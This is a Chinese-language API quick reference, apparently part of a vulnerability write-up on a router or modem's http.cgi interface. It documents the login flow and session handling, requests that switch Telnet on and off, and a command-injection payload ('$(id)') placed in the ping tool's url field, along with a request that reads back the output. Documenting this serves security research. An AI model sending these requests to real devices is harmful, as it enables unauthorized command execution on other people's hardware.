# 06. API 速查

## 公共请求格式

```http
POST /cgi-bin/http.cgi
Content-Type: application/json
```

```json
{
  "cmd": 100,
  "method": "GET 或 POST",
  "sessionId": "<64 位十六进制>"
}
```

- 未登录时 `sessionId` 可为空字符串。
- `method` 同时出现在 JSON 包体中；前端 axios 拦截器会强制把 HTTP 方法改为 POST。
- 部分接口成功时返回 `success: true`，但业务结果要看具体字段（如 `AUTH`、`login_fail`）。

## 本次用到的命令

| cmd | 名称 | 用途 |
|---:|---|---|
| 80 | `INIT_PAGE` | 设备/账号信息、`account_level`、`web_page_hide` |
| 100 | `LOGIN` | 登录 |
| 113 | `GET_SYS_STATUS` | 系统状态（部分无需登录） |
| 168 | `NETWORK_TOOLS` | ping/trace；`subcmd=0` 为 ping，`url` 存在注入 |
| 204 | `GET_FILE_DATA` | 读取 `/tmp/tzwww/pingrt` 等文件 |
| 232 | `GET_NEXT_LOGIN_TIME` | 获取登录 token / 锁定状态 |
| 234 | `SYS_SERVICE_SET` | Telnet/SSH 开关（本固件仅 Telnet 生效） |

## 常用请求示例

### 获取登录 token

```json
{"cmd":232,"method":"GET","sessionId":""}
```

### 登录

```json
{
  "cmd": 100,
  "method": "POST",
  "username": "admin",
  "passwd": "<sha256(token+password)>",
  "isAutoUpgrade": "0",
  "sessionId": ""
}
```

### 读取账号/设备信息

```json
{"cmd":80,"method":"GET","sessionId":""}
```

### 开启 Telnet

```json
{"cmd":234,"method":"POST","telnet":"1","ssh":"1","sessionId":"<sid>"}
```

### 关闭 Telnet

```json
{"cmd":234,"method":"POST","telnet":"0","ssh":"1","sessionId":"<sid>"}
```

### ping 注入

```json
{
  "cmd": 168,
  "method": "POST",
  "subcmd": 0,
  "pingTimes": 1,
  "url": "$(id)",
  "sessionId": "<sid>"
}
```

### 读取 ping 结果

```json
{
  "cmd": 204,
  "method": "GET",
  "url": "/tmp/tzwww/pingrt",
  "subcmd": 168,
  "sessionId": "<sid>"
}
```

返回为纯文本，不是 JSON。

## 前端代码中的相关常量

`app.23a1b2ed.js` 中的 `CMD` 表（节选）：

```text
PING_TEST: 7
INIT_PAGE: 80
LOGIN: 100
GET_SYS_STATUS: 113
NETWORK_TOOLS: 168
CONFIG_EXPORT: 180
CONFIG_UPDATE: 184
GET_FILE_DATA: 204
GET_NEXT_LOGIN_TIME: 232
RESET_LOGIN_TIME: 233
SYS_SERVICE_SET: 234
MODEM_LOG_SWITCH: 236
EXPORT_LOG: 241
```

## 会话说明

登录成功后返回的 `sessionId` 是 64 位十六进制字符串。后续请求直接使用明文：

```json
{"cmd":234,"method":"GET","sessionId":"<sessionId>"}
```

前端在 `sessionStorage` 中会用内置 RSA 公钥加密保存，但发送前会用私钥解密回明文。因此脚本无需做 RSA 处理。

> 内置私钥属于固件自带混淆，不是安全边界；不要把它当作密钥管理方案。
